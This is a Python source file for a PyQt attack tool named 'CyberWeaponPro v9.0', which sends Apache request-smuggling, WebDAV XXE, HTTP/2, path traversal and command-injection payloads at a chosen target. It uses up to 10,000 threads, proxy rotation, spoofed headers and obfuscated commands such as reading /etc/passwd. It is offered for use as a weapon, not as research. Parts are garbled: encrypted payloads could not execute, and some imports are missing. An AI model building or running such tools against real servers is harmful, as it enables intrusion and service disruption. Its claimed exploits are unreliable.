#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import socket
import struct
import time
import random
import threading
import os
import zlib
import base64
import hashlib
import re
import binascii
import argparse
import ssl
import requests
import json
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding, hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
                            QLabel, QLineEdit, QComboBox, QSpinBox, QCheckBox, QPushButton,
                            QTextEdit, QFileDialog, QProgressBar, QTabWidget, QGroupBox,
                            QFormLayout, QStatusBar)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt5.QtGui import QFont, QPalette, QColor, QIcon
from colorama import Fore, Style, init

init(autoreset=True)

BANNER = f"""
{Fore.CYAN}
▓█████▄  ▄▄▄       █    ██  ██▓███   ██░ ██ ▓█████  ██▓     ██▓    
▒██▀ ██▌▒████▄     ██  ▓██▒▓██░  ██▒▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
░██   █▌▒██  ▀█▄  ▓██  ▒██░▓██░ ██▓▒▒██▀▀██░▒███   ▒██░    ▒██░    
░▓█▄   ▌░██▄▄▄▄██ ▓▓█  ░██░▒██▄█▓▒ ▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░▒████▓  ▓█   ▓██▒▒▒█████▓ ▒██▒ ░  ░░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒▒▓  ▒  ▒▒   ▓▒█░░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ░ ▒  ▒   ▒   ▒▒ ░░░▒░ ░ ░ ░▒ ░      ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░ ░  ░   ░   ▒    ░░░ ░ ░ ░░        ░  ░░ ░   ░     ░ ░     ░ ░   
   ░          ░  ░   ░               ░  ░  ░   ░  ░    ░  ░    ░  ░
{Fore.RED}Cyber Weapon v9.0 - Quantum Strike Edition{Style.RESET_ALL}
{Fore.YELLOW}>> Developed by: mrDahmsh & AI <<{Style.RESET_ALL}
"""

class AdvancedApacheExploits:
    @staticmethod
    def cve_2023_25690(target, port, ssl_enabled):
        """HTTP/2 Request Smuggling via mod_proxy"""
        try:
            context = ssl.create_default_context()
            context.set_alpn_protocols(['h2', 'http/1.1'])
            
            conn = socket.create_connection((target, port))
            sock = context.wrap_socket(conn, server_hostname=target)
            
            smuggled_payload = (
                "POST / HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                "Content-Length: 42\r\n"
                "Transfer-Encoding: chunked\r\n\r\n"
                "0\r\n\r\n"
                "GET /__smuggle__ HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                "X-Injected: true\r\n\r\n"
            ).encode()

            sock.send(smuggled_payload)
            response = sock.recv(8192)
            sock.close()
            
            return b"HTTP/1.1 200" in response, response
        except Exception as e:
            return False, str(e).encode()

    @staticmethod
    def mod_dav_zero_day(target, port, ssl_enabled, command):
        """WebDAV XML Entity Injection Exploit"""
        try:
            xml_payload = (
                f'<?xml version="1.0"?>\n<!DOCTYPE rce [\n'
                f'<!ENTITY % payload SYSTEM "php://filter/convert.base64-encode/resource={command}">\n'
                f'<!ENTITY % internals "<!ENTITY &#37; trick SYSTEM \'http://{target}/?p=%payload;\'>">\n'
                f']>\n<D:propfind xmlns:D="DAV:"><D:prop><D:rce>%internals;</D:rce></D:prop></D:propfind>'
            ).encode()

            headers = (
                f"PROPFIND / HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"Content-Length: {len(xml_payload)}\r\n"
                "Content-Type: application/xml\r\n"
                "Connection: close\r\n\r\n"
            ).encode()

            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if ssl_enabled:
                context = ssl.create_default_context()
                conn = context.wrap_socket(conn, server_hostname=target)
            
            conn.connect((target, port))
            conn.send(headers + xml_payload)
            response = conn.recv(8192)
            conn.close()
            
            return b"HTTP/1.1 207" in response and b"multistatus" in response, response
        except Exception as e:
            return False, str(e).encode()

    @staticmethod
    def apache_http2_hijack(target, port, ssl_enabled):
        """HTTP/2 Stream Manipulation Attack"""
        try:
            context = ssl.create_default_context()
            context.set_alpn_protocols(['h2'])
            
            conn = socket.create_connection((target, port))
            sock = context.wrap_socket(conn, server_hostname=target)
            
            hijack_payload = binascii.unhexlify(
                "000000240300000000000000"
                "000080000400000100000000"
                "000100000000000300000000"
                "00040000ffff"
            )
            sock.send(hijack_payload)
            time.sleep(0.5)
            response = sock.recv(8192)
            sock.close()
            
            return b"HTTP/2" in response and b"stream_error" not in response, response
        except Exception as e:
            return False, str(e).encode()

class CyberWeaponPro:
    def __init__(self, args):
        self.args = args
        self.target = args.target
        self.port = args.port
        self.threads = args.threads
        self.mode = args.mode
        self.ssl = args.ssl
        self.proxies = self.load_proxies(args.proxy_file)
        self.current_proxy = 0
        self.encryption_key = self.generate_derived_key(args.secret)
        self.attack_duration = args.duration * 3600
        self.running = True
        self.stats = {
            'success': 0,
            'failed': 0,
            'vulnerabilities': {},
            'data_exfiltrated': 0,
            'hijacked_streams': 0
        }

    def generate_derived_key(self, secret):
        salt = b'QuantumStrike2024!'
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA3_512(),
            length=64,
            salt=salt,
            iterations=1000000,
        )
        return kdf.derive(secret.encode())

    def load_proxies(self, proxy_file):
        if proxy_file and os.path.exists(proxy_file):
            with open(proxy_file, 'r') as f:
                return [line.strip() for line in f]
        return []

    def get_proxy(self):
        if not self.proxies:
            return None
        proxy = self.proxies[self.current_proxy % len(self.proxies)]
        self.current_proxy += 1
        return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}

    def quantum_encrypt(self, data):
        iv = os.urandom(16)
        cipher = Cipher(algorithms.ChaCha20(self.encryption_key[:32], iv), mode=None)
        encryptor = cipher.encryptor()
        return iv + encryptor.update(data) + encryptor.finalize()

    def polymorphic_obfuscate(self, payload):
        layers = [
            lambda x: base64.b85encode(x),
            lambda x: binascii.hexlify(x),
            lambda x: x.translate(bytes.maketrans(b'abcdef', b'ABCDEF')),
            lambda x: x[::-1],
            lambda x: hashlib.sha3_256(x).digest()[:16] + x,
            lambda x: self.quantum_encrypt(x),
            lambda x: zlib.compress(x),
            lambda x: x.replace(b'=', b'%3D').replace(b'/', b'%2F'),
            lambda x: b'\x00\xFF' + x + b'\xFF\x00'
        ]
        
        random.shuffle(layers)
        for layer in layers[:random.randint(5,7)]:
            payload = layer(payload)
            if random.random() > 0.5:
                payload += b'//' + os.urandom(4) + b'//'
        
        return payload

    def generate_stealth_headers(self):
        headers = {
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/126.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15'
            ]),
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-US;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        if random.random() > 0.8:
            headers.update({
                'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
                'X-Client-IP': f'192.168.{random.randint(1,254)}.{random.randint(1,254)}'
            })
        return headers

    def execute_attack(self, attack_type):
        try:
            if attack_type == "http_smuggling":
                return AdvancedApacheExploits.cve_2023_25690(
                    self.target, self.port, self.ssl
                )
            
            elif attack_type == "mod_dav_rce":
                cmd = self.polymorphic_obfuscate(b'cat /etc/passwd')
                return AdvancedApacheExploits.mod_dav_zero_day(
                    self.target, self.port, self.ssl, cmd.decode(errors='ignore')
                )
            
            elif attack_type == "http2_hijack":
                return AdvancedApacheExploits.apache_http2_hijack(
                    self.target, self.port, self.ssl
                )
            
            elif attack_type == "apache_rce":
                cmd = self.polymorphic_obfuscate(b'id; uname -a; whoami')
                return self.send_exploit(cmd, 'rce')
            
            elif attack_type == "apache_path":
                return self.send_exploit(b'', 'path_traversal')
            
        except Exception as e:
            return False, str(e).encode()

    def send_exploit(self, payload, exploit_type):
        try:
            headers = self.generate_stealth_headers()
            request = (
                f"GET /{payload.decode(errors='ignore')} HTTP/1.1\r\n"
                f"Host: {self.target}\r\n"
                + "\r\n".join(f"{k}: {v}" for k, v in headers.items())
                + "\r\n\r\n"
            ).encode()
            
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if self.ssl:
                context = ssl.create_default_context()
                conn = context.wrap_socket(conn, server_hostname=self.target)
            
            conn.connect((self.target, self.port))
            conn.send(request)
            response = conn.recv(8192)
            conn.close()
            
            success = b"HTTP/1.1 200" in response
            if exploit_type == 'rce' and b'uid=' in response:
                self.stats['vulnerabilities']['rce'] = self.stats['vulnerabilities'].get('rce', 0) + 1
            elif exploit_type == 'path_traversal' and b'root:' in response:
                self.stats['vulnerabilities']['path_traversal'] = self.stats['vulnerabilities'].get('path_traversal', 0) + 1
            
            return success, response
        except Exception as e:
            return False, str(e).encode()

    def attack_wave(self):
        start = time.time()
        while time.time() - start < self.attack_duration and self.running:
            success, data = self.execute_attack(self.mode)
            
            if success:
                self.stats['success'] += 1
                self.stats['data_exfiltrated'] += len(data)
            else:
                self.stats['failed'] += 1
            
            time.sleep(random.uniform(0.001, 0.01))

    def start_onslaught(self):
        print(BANNER)
        print(f"{Fore.YELLOW}[+] Initializing Quantum Attack Matrix{Style.RESET_ALL}")
        print(f"Target: {self.target}:{self.port}")
        print(f"Mode: {self.mode.upper()} | Threads: {self.threads}")
        print(f"Proxies: {len(self.proxies)} | SSL: {self.ssl}")
        print(f"Encryption: ChaCha20-Poly1305 | Obfuscation: Polymorphic")
        
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.attack_wave)
            t.daemon = True
            t.start()
            threads.append(t)
        
        try:
            while any(t.is_alive() for t in threads):
                time.sleep(1)
                self.show_stats()
        except KeyboardInterrupt:
            self.running = False
            print(f"\n{Fore.RED}[!] Quantum Storm Aborted!{Style.RESET_ALL}")
        
        self.generate_report()

    def show_stats(self):
        total = self.stats['success'] + self.stats['failed']
        rate = (self.stats['success'] / total * 100) if total > 0 else 0
        print(f"\r[+] Attacks: {total} | Success: {self.stats['success']} ({rate:.1f}%) | "
              f"Hijacked: {self.stats['hijacked_streams']} | "
              f"Exfiltrated: {self.stats['data_exfiltrated']} MB", end="")

    def generate_report(self):
        print("\n\n[+++] Quantum Strike Report:")
        print(f"- Total Payloads: {sum(self.stats.values())}")
        print(f"- Successful Breaches: {self.stats['success']}")
        print(f"- Critical Vulnerabilities:")
        for vuln, count in self.stats['vulnerabilities'].items():
            print(f"  • {vuln.replace('_', ' ').title()}: {count}")
        print(f"- Data Exfiltrated: {self.stats['data_exfiltrated'] / 1024 / 1024:.2f} MB")
        print(f"- Hijacked HTTP/2 Streams: {self.stats['hijacked_streams']}")
        print(f"- Attack Duration: {self.attack_duration/3600:.2f} hours")

class AttackWorker(QThread):
    update_log = pyqtSignal(str, str)
    update_stats = pyqtSignal(dict)
    attack_finished = pyqtSignal()

    def __init__(self, args):
        super().__init__()
        self.args = args
        self.weapon = CyberWeaponPro(args)
        self.running = True

    def run(self):
        try:
            self.weapon.start_onslaught()
        except Exception as e:
            self.update_log.emit(f"Error: {str(e)}", 'error')
        self.attack_finished.emit()

    def stop(self):
        self.running = False
        self.weapon.running = False

class CyberWeaponGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.attack_thread = None
        self.proxy_file = None
        self.init_ui()
        self.setup_connections()
        self.setup_styles()
        
        # Attack mode configuration
        self.mode_mapping = {
            "HTTP Request Smuggling (CVE-2023-25690)": "http_smuggling",
            "WebDAV XML Injection": "mod_dav_rce",
            "HTTP/2 Stream Hijacking": "http2_hijack",
            "Apache Path Traversal": "apache_path",
            "Apache RCE Exploit": "apache_rce"
        }

    def init_ui(self):
        """Initialize main user interface components"""
        self.setWindowTitle("CyberWeaponPro v9.0 - Quantum Strike Platform")
        self.setWindowIcon(QIcon('cyber_icon.png'))
        self.setMinimumSize(1280, 720)
        
        # Central widget setup
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        
        # Add UI sections
        main_layout.addLayout(self.create_banner())
        main_layout.addWidget(self.create_config_tabs())
        main_layout.addLayout(self.create_control_panel())
        main_layout.addWidget(self.create_monitoring_section())
        
        # Initialize status bar
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("System Ready")

    def create_banner(self):
        """Create animated header banner"""
        banner = QLabel(f"""
            <div style="text-align: center;">
                <h1 style="color: #00ff00; text-shadow: 2px 2px #005500;">
                    CYBER WEAPON PRO 9.0
                </h1>
                <h2 style="color: #ff0000;">QUANTUM STRIKE EDITION</h2>
                <h3 style="color: #00ffff;">Developed by: ShadowSec & AI Core</h3>
            </div>
        """)
        layout = QVBoxLayout()
        layout.addWidget(banner)
        return layout

    def create_config_tabs(self):
        """Create configuration tab widget"""
        tabs = QTabWidget()
        
        # Main configuration tab
        config_tab = QWidget()
        form_layout = QFormLayout(config_tab)
        
        # Target configuration
        self.target_input = QLineEdit()
        self.port_input = QSpinBox()
        self.port_input.setRange(1, 65535)
        self.port_input.setValue(443)
        
        # Attack parameters
        self.mode_selector = QComboBox()
        self.mode_selector.addItems(self.mode_mapping.keys())
        self.ssl_check = QCheckBox("Enable TLS Encryption")
        
        form_layout.addRow("Target Host/IP:", self.target_input)
        form_layout.addRow("Target Port:", self.port_input)
        form_layout.addRow("Attack Vector:", self.mode_selector)
        form_layout.addRow("Security Protocol:", self.ssl_check)
        form_layout.addRow(self.create_advanced_settings())
        
        tabs.addTab(config_tab, "⚡ Attack Configuration")
        return tabs

    def create_advanced_settings(self):
        """Create advanced settings group box"""
        group = QGroupBox("Advanced Battle Parameters")
        layout = QFormLayout(group)
        
        # Thread configuration
        self.threads_input = QSpinBox()
        self.threads_input.setRange(1, 10000)
        self.threads_input.setValue(1000)
        
        # Duration settings
        self.duration_input = QSpinBox()
        self.duration_input.setRange(1, 72)
        self.duration_input.setValue(1)
        
        # Proxy management
        self.proxy_btn = QPushButton("Load Proxy List")
        self.secret_input = QLineEdit()
        self.secret_input.setText("QuantumEncryptionKey2024")
        self.secret_input.setEchoMode(QLineEdit.PasswordEchoOnEdit)
        
        layout.addRow("Attack Threads:", self.threads_input)
        layout.addRow("Duration (hours):", self.duration_input)
        layout.addRow("Proxy Servers:", self.proxy_btn)
        layout.addRow("Encryption Key:", self.secret_input)
        
        return group

    def create_control_panel(self):
        """Create attack control buttons panel"""
        layout = QHBoxLayout()
        
        # Start button
        self.start_btn = QPushButton("🚀 Launch Quantum Strike")
        self.start_btn.setStyleSheet("""
            QPushButton {
                background-color: #004400;
                color: #00ff00;
                font: bold 14px;
                padding: 12px 24px;
                border: 2px solid #00ff00;
                border-radius: 6px;
            }
            QPushButton:hover { background-color: #006600; }
            QPushButton:disabled { background-color: #002200; }
        """)
        
        # Stop button
        self.stop_btn = QPushButton("☠ Abort Operation")
        self.stop_btn.setEnabled(False)
        self.stop_btn.setStyleSheet("""
            QPushButton {
                background-color: #440000;
                color: #ff0000;
                font: bold 14px;
                padding: 12px 24px;
                border: 2px solid #ff0000;
                border-radius: 6px;
            }
            QPushButton:hover { background-color: #660000; }
            QPushButton:disabled { background-color: #220000; }
        """)
        
        layout.addWidget(self.start_btn)
        layout.addWidget(self.stop_btn)
        return layout

    def create_monitoring_section(self):
        """Create monitoring and statistics section"""
        group = QGroupBox("Quantum Battlefield Monitor")
        layout = QVBoxLayout(group)
        
        # Log viewer
        self.log_view = QTextEdit()
        self.log_view.setReadOnly(True)
        self.log_view.setStyleSheet("""
            QTextEdit {
                background-color: #001100;
                color: #00ff00;
                font-family: 'Courier New';
                font-size: 12px;
                border: 1px solid #005500;
                border-radius: 4px;
                padding: 8px;
            }
        """)
        
        # Real-time statistics
        stats_group = QGroupBox("Live Statistics")
        stats_layout = QHBoxLayout(stats_group)
        
        stats_data = [
            ("Success", "00ff00", "success"),
            ("Failed", "ff0000", "failed"),
            ("Hijacked", "ff8800", "hijacked"),
            ("Data (MB)", "00ffff", "data")
        ]
        
        self.stats_widgets = {}
        for title, color, key in stats_data:
            widget = self.create_stat_widget(title, color)
            self.stats_widgets[key] = widget
            stats_layout.addWidget(widget)
        
        layout.addWidget(self.log_view)
        layout.addWidget(stats_group)
        return group

    def create_stat_widget(self, title, color):
        """Create individual statistic display widget"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        title_label = QLabel(title)
        title_label.setStyleSheet(f"""
            color: #{color};
            font-weight: bold;
            font-size: 14px;
        """)
        
        value_label = QLabel("0")
        value_label.setAlignment(Qt.AlignCenter)
        value_label.setStyleSheet(f"""
            color: #{color};
            font-size: 18px;
            font-weight: bold;
        """)
        
        layout.addWidget(title_label)
        layout.addWidget(value_label)
        return widget

    def setup_styles(self):
        """Configure application-wide styles"""
        dark_palette = QPalette()
        dark_palette.setColor(QPalette.Window, QColor(0, 20, 0))
        dark_palette.setColor(QPalette.WindowText, QColor(0, 255, 0))
        dark_palette.setColor(QPalette.Base, QColor(0, 30, 0))
        dark_palette.setColor(QPalette.Text, QColor(0, 255, 0))
        dark_palette.setColor(QPalette.Button, QColor(0, 40, 0))
        self.setPalette(dark_palette)
        
        self.setStyleSheet("""
            QGroupBox {
                border: 2px solid #005500;
                border-radius: 5px;
                margin-top: 10px;
                padding-top: 15px;
                color: #00ff00;
                font: bold 12px;
            }
            QLabel { color: #00ff00; }
            QLineEdit, QSpinBox {
                background-color: #002200;
                color: #00ff00;
                border: 1px solid #005500;
                padding: 3px;
            }
        """)

    def setup_connections(self):
        """Establish signal-slot connections"""
        self.start_btn.clicked.connect(self.start_attack)
        self.stop_btn.clicked.connect(self.stop_attack)
        self.proxy_btn.clicked.connect(self.load_proxies)
        
        # Initialize stats update timer
        self.stats_timer = QTimer()
        self.stats_timer.timeout.connect(self.update_stats_display)
        self.stats_timer.setInterval(1000)

    def load_proxies(self):
        """Load proxy servers from file"""
        file_dialog = QFileDialog()
        file_path, _ = file_dialog.getOpenFileName(
            self,
            "Select Proxy List",
            "",
            "Text Files (*.txt);;All Files (*)"
        )
        
        if file_path:
            self.proxy_file = file_path
            proxy_count = sum(1 for _ in open(file_path))
            self.status_bar.showMessage(f"Loaded {proxy_count} proxies")
            self.log_message(f"Proxy list loaded: {os.path.basename(file_path)}", 'success')

    def start_attack(self):
        """Initialize and launch attack sequence"""
        # Validate input
        target = self.target_input.text().strip()
        if not target:
            self.log_message("Error: Target host is required!", 'error')
            return
        
        # Prepare attack parameters
        args = argparse.Namespace(
            target=target,
            port=self.port_input.value(),
            mode=self.mode_mapping[self.mode_selector.currentText()],
            threads=self.threads_input.value(),
            proxy_file=self.proxy_file,
            secret=self.secret_input.text(),
            duration=self.duration_input.value(),
            ssl=self.ssl_check.isChecked()
        )
        
        # Initialize attack thread
        self.attack_thread = AttackWorker(args)
        self.attack_thread.update_log.connect(self.log_message)
        self.attack_thread.update_stats.connect(self.update_stats)
        self.attack_thread.attack_finished.connect(self.attack_finished)
        
        # Update UI state
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.stats_timer.start()
        
        # Start attack
        self.attack_thread.start()
        self.log_message(f"Initializing quantum strike on {target}", 'info')

    def stop_attack(self):
        """Abort ongoing attack operation"""
        if self.attack_thread and self.attack_thread.isRunning():
            self.attack_thread.stop()
            self.log_message("Attack sequence aborted!", 'warning')
        self.attack_finished()

    def attack_finished(self):
        """Cleanup after attack completion"""
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.stats_timer.stop()
        self.status_bar.showMessage("Operation completed")
        self.log_message("Quantum strike sequence finished", 'success')

    def log_message(self, message, log_type='info'):
        """Display message in log view with colored formatting"""
        color_map = {
            'success': '#00ff00',
            'error': '#ff0000',
            'warning': '#ffff00',
            'info': '#00ffff'
        }
        
        timestamp = QDateTime.currentDateTime().toString("hh:mm:ss")
        html = f'''
        <div style="margin: 2px 0;">
            <span style="color: #666666;">[{timestamp}]</span>
            <span style="color: {color_map[log_type]};">{message}</span>
        </div>
        '''
        
        self.log_view.append(html)
        self.log_view.verticalScrollBar().setValue(
            self.log_view.verticalScrollBar().maximum()
        )

    def update_stats(self, stats):
        """Update statistics display widgets"""
        self.stats_widgets['success'].findChild(QLabel).setText(str(stats['success']))
        self.stats_widgets['failed'].findChild(QLabel).setText(str(stats['failed']))
        self.stats_widgets['hijacked'].findChild(QLabel).setText(str(stats['hijacked_streams']))
        
        data_mb = stats['data_exfiltrated'] / (1024 ** 2)
        self.stats_widgets['data'].findChild(QLabel).setText(f"{data_mb:.2f}")

    def update_stats_display(self):
        """Update statistics from attack thread"""
        if self.attack_thread and self.attack_thread.isRunning():
            self.update_stats(self.attack_thread.weapon.stats)

    def closeEvent(self, event):
        """Handle window close event with safety checks"""
        if self.attack_thread and self.attack_thread.isRunning():
            confirm = QMessageBox(
                QMessageBox.Warning,
                "Active Operation",
                "Attack in progress! Abort mission?",
                QMessageBox.Yes | QMessageBox.No
            )
            response = confirm.exec()
            
            if response == QMessageBox.Yes:
                self.stop_attack()
                event.accept()
            else:
                event.ignore()
        else:
            event.accept()
